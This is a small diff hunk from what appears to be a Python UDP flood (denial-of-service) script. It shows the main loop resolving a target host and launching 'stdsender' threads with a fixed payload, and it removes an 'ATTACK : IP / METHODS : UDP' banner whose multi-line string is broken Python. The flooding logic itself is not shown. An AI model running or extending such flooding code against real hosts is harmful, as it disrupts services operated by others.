@@ -257,11 +257,7 @@ def main():
 					socket.gethostbyname(host)
 					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
 					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
-					print("╔════════════════════════╗
-                                                 ║ATTACK : IP                                                  ║
-                                                 ║METHODS : UDP                                         ║
-                                                 ║ATTACK BY : JERZZY                                ║
-                                                 ╚════════════════════════╝")
+					
 			except ValueError:
 				main()
 			except socket.gaierror:
